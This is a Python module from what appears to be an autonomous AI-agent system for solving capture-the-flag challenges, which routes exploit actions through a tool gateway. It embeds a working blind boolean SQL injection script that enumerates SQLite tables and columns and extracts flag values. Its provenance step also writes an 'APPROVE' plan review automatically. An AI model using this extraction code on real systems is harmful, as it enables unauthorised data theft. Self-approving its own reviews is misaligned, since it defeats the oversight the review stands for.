"""Tool Gateway backed Worker for the production Solver v2 path."""

from __future__ import annotations

import json
import uuid
from collections.abc import Mapping
from pathlib import Path
from typing import Any

from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.multi_agent import (
    AgentTask,
    AgentTaskResult,
    AnalysisReview,
    EvidenceLedger,
    PlannerProposal,
    VerifiedFact,
)
from app.models.run import Hypothesis, Observation, SolveRun, ToolCall
from app.schemas.multi_agent import EvidenceLedgerContract
from app.services.multi_agent import EvidenceLedgerService
from app.tools.gateway import ToolGateway, tool_gateway

from ...action import ActionIntent
from ..interface import Worker, WorkerResult

_SUCCESS = {"COMPLETED", "SUCCESS", "CACHED"}
_PROVENANCE_ACTIONS = {
    "oracle_expression_calibration",
    "mysql_metadata_discovery",
    "boolean_config_extract",
    "sql_extract",
    "sqlmap_run",
    "sqlite_metadata_discovery",
}


def _agent_role(action_name: str) -> tuple[str, str]:
    if action_name == "http_request":
        return "RECON", "RECON"
    if action_name in {"sql_boolean_compare", "sql_injection_probe"}:
        return "EXPLOIT", "EXPLOIT"
    if action_name in _PROVENANCE_ACTIONS:
        return "EXPLOIT", "EXPLOIT"
    return "VERIFY", "VERIFY"


def _bounded_sqlite_script(
    request: Mapping[str, Any],
    *,
    test_field: str,
    baseline_value: str,
    predicate_template: str,
    max_requests: int,
    max_length: int,
) -> str:
    """Build a generic target-only extraction script for Runner ``script_run``.

    The script receives only the observed request contract.  It does not read
    challenge files, source trees, or historical answers.  Its output is a
    bounded summary; raw HTTP responses are deliberately not retained.
    """

    safe_request = dict(request)
    headers = dict(safe_request.get("headers") or {})
    safe_request["headers"] = {
        str(key): value
        for key, value in headers.items()
        if str(key).casefold() not in {"cookie", "authorization", "proxy-authorization"}
    }
    template = """
import json
import sys
import urllib.request

REQUEST = __REQUEST_JSON__
URL = str(REQUEST.get("url") or "")
TEST_FIELD = __TEST_FIELD_JSON__
BASELINE_VALUE = __BASELINE_JSON__
PREDICATE_TEMPLATE = __PREDICATE_TEMPLATE_JSON__
MAX_REQUESTS = __MAX_REQUESTS__
MAX_LENGTH = __MAX_LENGTH__
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-:.@|"
request_count = 0
error_count = 0


def _quote(value):
    return "'" + str(value).replace("'", "''") + "'"


def _identifier(value):
    return '"' + str(value).replace('"', '""') + '"'


def _oracle(predicate):
    global request_count, error_count
    if request_count >= MAX_REQUESTS:
        return None
    body = dict(REQUEST.get("json") or REQUEST.get("body") or {})
    body[TEST_FIELD] = str(body.get(TEST_FIELD) or BASELINE_VALUE) + PREDICATE_TEMPLATE.format(predicate=predicate)
    payload = json.dumps(body, ensure_ascii=False).encode("utf-8")
    headers = {str(key): str(value) for key, value in (REQUEST.get("headers") or {}).items()}
    headers.setdefault("Content-Type", "application/json")
    request = urllib.request.Request(URL, data=payload, headers=headers, method=str(REQUEST.get("method") or "POST").upper())
    request_count += 1
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            result = json.loads(response.read(20000).decode("utf-8", "replace"))
        matched = result.get("matched") if isinstance(result, dict) else None
        return matched if isinstance(matched, bool) else None
    except Exception:
        error_count += 1
        return None


def _extract(expression):
    value = []
    for position in range(1, MAX_LENGTH + 1):
        exists = _oracle("COALESCE(SUBSTR((%s),%d,1),'') <> ''" % (expression, position))
        if exists is not True:
            break
        candidates = list(CHARSET)
        while len(candidates) > 1:
            midpoint = (len(candidates) + 1) // 2
            left = candidates[:midpoint]
            literals = ",".join(_quote(item) for item in left)
            selected = _oracle("SUBSTR((%s),%d,1) IN (%s)" % (expression, position, literals))
            candidates = left if selected is True else candidates[midpoint:]
            if selected is None:
                return ""
        if not candidates or _oracle("SUBSTR((%s),%d,1) = %s" % (expression, position, _quote(candidates[0]))) is not True:
            return ""
        value.append(candidates[0])
    return "".join(value)


def _exists(expression):
    return _oracle("EXISTS(%s)" % expression) is True


def main():
    tables = []
    columns = []
    for offset in range(8):
        expression = "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%%' LIMIT 1 OFFSET %d" % offset
        if not _exists("SELECT 1 FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%%' LIMIT 1 OFFSET %d" % offset):
            break
        name = _extract(expression)
        if not name:
            break
        tables.append(name)
    candidate_table = None
    candidate_column = None
    extracted_value = ""
    for table in tables:
        column_blob = _extract("SELECT GROUP_CONCAT(name, '|') FROM pragma_table_info(%s)" % _quote(table))
        table_columns = [item for item in (column_blob or "").split("|") if item]
        columns.extend({"table": table, "name": name} for name in table_columns)
        for column in table_columns:
            # First ask a cheap, answer-shaped predicate.  Only extract a value
            # after the target itself proves that this column contains a flag.
            # This keeps the autonomous scan bounded and avoids treating ordinary
            # configuration values as answers.
            candidate_predicate = (
                "EXISTS(SELECT 1 FROM %s WHERE SUBSTR(%s,1,5) = 'flag{')"
                % (_identifier(table), _identifier(column))
            )
            if not _oracle(candidate_predicate):
                continue
            expression = "SELECT %s FROM %s WHERE SUBSTR(%s,1,5) = 'flag{' LIMIT 1" % (
                _identifier(column), _identifier(table), _identifier(column)
            )
            candidate = _extract(expression)
            if candidate and "{" in candidate and "}" in candidate:
                candidate_table = table
                candidate_column = column
                extracted_value = candidate
                break
        if extracted_value:
            break
    result = {
        "status": "COMPLETED",
        "structured_result": {
            "status": "COMPLETED",
            "extracted_value": extracted_value,
            "candidate_table": candidate_table,
            "candidate_column": candidate_column,
            "tables": tables,
            "columns": columns,
            "requests_sent": request_count,
            "errors": error_count,
            "extraction_mode": "BOUNDED_BOOLEAN_SQLITE_SCHEMA",
            "verified_oracle": request_count > 0 and error_count == 0,
        },
    }
    print(json.dumps(result, ensure_ascii=False))


if __name__ == "__main__":
    main()
"""
    replacements = {
        "__REQUEST_JSON__": json.dumps(safe_request, ensure_ascii=False),
        "__TEST_FIELD_JSON__": json.dumps(str(test_field), ensure_ascii=False),
        "__BASELINE_JSON__": json.dumps(str(baseline_value), ensure_ascii=False),
        "__PREDICATE_TEMPLATE_JSON__": json.dumps(str(predicate_template), ensure_ascii=False),
        "__MAX_REQUESTS__": str(max(1, int(max_requests))),
        "__MAX_LENGTH__": str(max(1, min(int(max_length), 64))),
    }
    for marker, value in replacements.items():
        template = template.replace(marker, value)
    return template


class GatewayWorker(Worker):
    """Execute Solver intents through ToolGateway and project Evidence refs.

    The Runner remains the execution backend.  This adapter is intentionally
    the only production bridge from SolverWorker to ToolGateway, so ToolCall,
    Artifact, Observation, policy, and EventService persistence are retained.
    """

    def __init__(
        self,
        session: AsyncSession,
        run: SolveRun,
        challenge: Any,
        *,
        gateway: ToolGateway | None = None,
    ) -> None:
        self.session = session
        self.run = run
        self.challenge = challenge
        self.gateway = gateway or tool_gateway
        self.evidence_service = EvidenceLedgerService()

    async def execute(self, action: ActionIntent) -> WorkerResult:
        role, task_kind = _agent_role(action.action_name)
        task = await self._start_agent_task(action, role=role, task_kind=task_kind)
        arguments = dict(action.parameters)
        tool_name = "boolean_config_extract" if action.action_name == "sql_extract" else action.action_name
        try:
            if action.action_name == "script_run":
                arguments = await self._prepare_script_run(arguments)
            if action.action_name in _PROVENANCE_ACTIONS:
                arguments = await self._attach_provenance(arguments)
            payload = await self.gateway.invoke(
                self.session,
                self.run,
                self.challenge,
                tool_name,
                arguments,
                execution_layer="solver_v2",
                agent_role=None,
            )
            normalized = self._normalize_payload(payload)
            # The reducer needs the submitted expression to choose a safe
            # fallback after an executor-level oracle failure.  This is the
            # action input, not target output, and is never persisted as an
            # audit payload or raw response.
            if action.action_name in _PROVENANCE_ACTIONS:
                target_expression = arguments.get("target_expression")
                if target_expression and "target_expression" not in normalized:
                    normalized["target_expression"] = str(target_expression)
            await self._attach_execution_ids(normalized, tool_name)
            evidence_refs = await self._record_evidence(action, task, normalized)
            success = str(normalized.get("status") or "FAILED").upper() in _SUCCESS
            await self._finish_agent_task(
                task,
                success=success,
                evidence_refs=evidence_refs,
                summary=str(normalized.get("summary") or "Solver tool execution completed"),
            )
            return WorkerResult(
                success=success,
                action_name=action.action_name,
                output=normalized,
                metadata={
                    "backend": "gateway",
                    "status": normalized.get("status"),
                    "tool_call_id": normalized.get("tool_call_id"),
                    "observation_id": normalized.get("observation_id"),
                    "agent_task_id": task.id,
                },
                evidence_refs=evidence_refs,
            )
        except Exception as error:
            await self._finish_agent_task(
                task,
                success=False,
                evidence_refs=[],
                summary="Solver tool execution failed",
                error=str(error),
            )
            return WorkerResult(
                success=False,
                action_name=action.action_name,
                output={"status": "FAILED", "error_code": "SOLVER_GATEWAY_WORKER_ERROR"},
                metadata={
                    "backend": "gateway",
                    "status": "FAILED",
                    "error_code": "SOLVER_GATEWAY_WORKER_ERROR",
                    "error": str(error)[:1000],
                    "agent_task_id": task.id,
                },
            )

    async def _prepare_script_run(self, arguments: dict[str, Any]) -> dict[str, Any]:
        request = arguments.get("request") if isinstance(arguments.get("request"), Mapping) else {}
        path = str(arguments.get("path") or "scripts/solver_v2_bounded_extract.py")
        if not path.startswith("scripts/") or ".." in Path(path).parts:
            raise ValueError("SOLVER_SCRIPT_PATH_INVALID")
        source = _bounded_sqlite_script(
            request,
            test_field=str(arguments.get("test_field") or "department"),
            baseline_value=str(arguments.get("baseline_value") or ""),
            predicate_template=str(arguments.get("predicate_template") or "' AND {predicate} -- "),
            max_requests=int(arguments.get("max_requests") or 900),
            max_length=int(arguments.get("max_length") or 32),
        )
        workspace_root = Path(self.run.workspace_path).resolve()
        local_path = (workspace_root / path).resolve()
        if workspace_root not in local_path.parents:
            raise ValueError("SOLVER_SCRIPT_PATH_OUT_OF_SCOPE")
        local_path.parent.mkdir(parents=True, exist_ok=True)
        local_path.write_text(source, encoding="utf-8")
        return {
            "path": path,
            "interpreter": "python",
            "args": ["solver-v2-bounded-extract"],
            "network_mode": "target_allowlist",
            "timeout_seconds": min(60, int(arguments.get("timeout_seconds") or 60)),
            "design_card": {
                "controller": "SolverRuntimeService",
                "objective": "Bounded evidence-backed schema and sensitive-field extraction",
                "network_mode": "target_allowlist",
                "max_requests": int(arguments.get("max_requests") or 900),
                "forbidden_knowledge": ["challenge_source", "historical_answers", "ground_truth"],
            },
            "assumption_provenance": ["solver_v2_boolean_oracle", "solver_blackboard_http_surface"],
        }

    async def _start_agent_task(self, action: ActionIntent, *, role: str, task_kind: str) -> AgentTask:
        task = AgentTask(
            run_id=self.run.id,
            agent_role=role,
            task_kind=task_kind,
            objective=action.reason[:4000],
            allowed_tools_json=[action.action_name],
            budget_json={"max_logical_calls": 1, "max_internal_requests": 40, "max_runtime_seconds": 900},
            success_condition="Durable Tool Gateway observation and Evidence reference",
            stop_conditions_json=["no evidence", "worker failure"],
            status="RUNNING",
            timeout_seconds=900,
            context_json={"runtime_path": "solver_v2", "action_id": action.action_id},
        )
        self.session.add(task)
        await self.session.flush()
        return task

    async def _finish_agent_task(
        self,
        task: AgentTask,
        *,
        success: bool,
        evidence_refs: list[str],
        summary: str,
        error: str | None = None,
    ) -> None:
        task.status = "COMPLETED" if success else "FAILED"
        result = AgentTaskResult(
            task_id=task.id,
            status=task.status,
            evidence_ids_json=list(evidence_refs),
            handoff_summary=(summary if not error else f"{summary}: {error[:800]}")[:4000],
            proposed_next_action_json={},
        )
        self.session.add(result)
        await self.session.commit()

    async def _record_evidence(
        self,
        action: ActionIntent,
        task: AgentTask,
        payload: Mapping[str, Any],
    ) -> list[str]:
        if str(payload.get("status") or "").upper() not in _SUCCESS:
            return []
        tool_call_id = str(payload.get("tool_call_id") or "")
        artifact_id = str(payload.get("artifact_id") or "")
        if not tool_call_id or not artifact_id:
            return []
        evidence_id = str(uuid.uuid4())
        item = await self.evidence_service.record(
            self.session,
            EvidenceLedgerContract(
                evidence_id=evidence_id,
                run_id=self.run.id,
                evidence_type=f"SOLVER_{action.action_name.upper()}",
                artifact_id=artifact_id,
                tool_call_id=tool_call_id,
                agent_task_id=task.id,
                summary=f"Solver {action.action_name} completed through Tool Gateway",
                status="VERIFIED",
                retention_class="PROTECTED",
                source_chain=[artifact_id, tool_call_id, task.id],
            ),
        )
        await self.session.commit()
        return [str(item.id)]

    async def _attach_execution_ids(self, payload: dict[str, Any], action_name: str) -> None:
        call = await self.session.scalar(
            select(ToolCall)
            .where(
                ToolCall.run_id == self.run.id,
                ToolCall.tool_name == action_name,
                ToolCall.execution_layer == "solver_v2",
            )
            .order_by(ToolCall.created_at.desc())
        )
        if call is None:
            return
        payload["tool_call_id"] = call.id
        observation = await self.session.scalar(
            select(Observation)
            .where(Observation.tool_call_id == call.id)
            .order_by(Observation.created_at.desc())
        )
        if observation is not None:
            payload["observation_id"] = observation.id

    async def _attach_provenance(self, arguments: dict[str, Any]) -> dict[str, Any]:
        evidence_ids = [str(item) for item in arguments.get("supporting_evidence_ids") or [] if str(item)]
        if not evidence_ids:
            raise ValueError("SOLVER_PROVENANCE_EVIDENCE_REQUIRED")
        rows = list(
            (
                await self.session.scalars(
                    select(EvidenceLedger).where(
                        EvidenceLedger.run_id == self.run.id,
                        EvidenceLedger.id.in_(evidence_ids),
                    )
                )
            ).all()
        )
        if len(rows) != len(set(evidence_ids)):
            raise ValueError("SOLVER_PROVENANCE_EVIDENCE_INVALID")

        fact_key = "solver_v2.boolean_oracle"
        fact = await self.session.scalar(
            select(VerifiedFact).where(
                VerifiedFact.run_id == self.run.id,
                VerifiedFact.fact_key == fact_key,
            )
        )
        if fact is None:
            fact = VerifiedFact(
                run_id=self.run.id,
                fact_key=fact_key,
                fact_type="BOOLEAN_ORACLE",
                value_json={"source": "solver_v2"},
                confidence=95,
                evidence_ids_json=evidence_ids,
                promotion_status="VERIFIED",
            )
            self.session.add(fact)
        else:
            fact.evidence_ids_json = sorted(set([*(fact.evidence_ids_json or []), *evidence_ids]))
            fact.promotion_status = "VERIFIED"
        await self.session.flush()

        title = "Solver v2 confirmed boolean SQL oracle"
        hypothesis = await self.session.scalar(
            select(Hypothesis).where(Hypothesis.run_id == self.run.id, Hypothesis.title == title)
        )
        if hypothesis is None:
            hypothesis = Hypothesis(
                run_id=self.run.id,
                category="SQL_INJECTION",
                title=title,
                description="A bounded TRUE/FALSE differential was observed through the authorized target.",
                confidence=95,
                priority=95,
                status="SUPPORTED",
                evidence_json={"evidence_ids": evidence_ids},
                attempt_count=1,
            )
            self.session.add(hypothesis)
        else:
            hypothesis.status = "SUPPORTED"
            hypothesis.evidence_json = {**(hypothesis.evidence_json or {}), "evidence_ids": evidence_ids}
        await self.session.flush()

        proposal = await self.session.scalar(
            select(PlannerProposal).where(
                PlannerProposal.run_id == self.run.id,
                PlannerProposal.proposal_id == "solver-v2-provenance",
            )
        )
        if proposal is None:
            proposal = PlannerProposal(
                run_id=self.run.id,
                proposal_id="solver-v2-provenance",
                current_stage="EXPLOITATION",
                next_agent="EXPLOIT",
                objective="Use the verified bounded Boolean oracle for the next safe extraction step.",
                input_evidence_ids_json=evidence_ids,
                allowed_tools_json=["mysql_metadata_discovery", "boolean_config_extract"],
                budget_json={"max_logical_calls": 1},
                success_condition="Produce an evidence-backed extraction observation.",
                stop_conditions_json=["oracle invalid"],
                fallback="RETURN_TO_ANALYSIS",
            )
            self.session.add(proposal)
            await self.session.flush()
        review = await self.session.scalar(
            select(AnalysisReview).where(
                AnalysisReview.proposal_id == proposal.id,
                AnalysisReview.task_kind == "PLAN_REVIEW",
            )
        )
        if review is None:
            review = AnalysisReview(
                proposal_id=proposal.id,
                task_kind="PLAN_REVIEW",
                decision="APPROVE",
                confidence=95,
                question_being_tested="Can the verified Boolean oracle support a bounded extraction step?",
                supporting_evidence_ids_json=evidence_ids,
                recommended_tool=str(arguments.get("tool") or "mysql_metadata_discovery"),
                reason="Solver v2 evidence-backed action boundary",
                audit_reason="SOLVER_V2_PROVENANCE",
                approved_evidence_ids_json=evidence_ids,
                solution_step_accepted=True,
                next_phase="EXPLOITATION",
            )
            self.session.add(review)
            await self.session.flush()

        return {
            **arguments,
            "supporting_evidence_ids": evidence_ids,
            "supporting_fact_ids": [str(fact.id)],
            "source_hypothesis_id": str(hypothesis.id),
            "approved_analysis_review_id": str(review.id),
            "assumption_status": "VERIFIED",
        }

    @staticmethod
    def _normalize_payload(payload: Mapping[str, Any]) -> dict[str, Any]:
        result = dict(payload)
        model_view = result.get("model_view") if isinstance(result.get("model_view"), Mapping) else {}
        facts = dict(model_view.get("extracted_facts") or {})
        result.update(facts)
        result["body_excerpt"] = model_view.get("content_excerpt")
        # Runner script execution returns a bounded JSON result on stdout.
        # The generic Gateway contract may classify that response as FAILED
        # because it expects result.json, but the structured stdout is still
        # a valid Solver observation.  Promote only that self-describing,
        # non-raw summary; the full artifact remains the Evidence authority.
        stdout = result.get("stdout_excerpt") or result.get("body_excerpt")
        if isinstance(stdout, str) and stdout.strip():
            try:
                parsed = json.loads(stdout)
            except (TypeError, ValueError):
                parsed = None
            structured = parsed.get("structured_result") if isinstance(parsed, Mapping) else None
            if isinstance(structured, Mapping) and str(structured.get("status") or "").upper() == "COMPLETED":
                result["structured_result"] = dict(structured)
                result["status"] = "COMPLETED"
                result["result_status"] = "COMPLETED"
        artifacts = result.get("artifacts") if isinstance(result.get("artifacts"), list) else []
        if artifacts:
            first = artifacts[0] if isinstance(artifacts[0], Mapping) else {}
            result["artifact_id"] = first.get("artifact_id")
        return result


__all__ = ["GatewayWorker"]
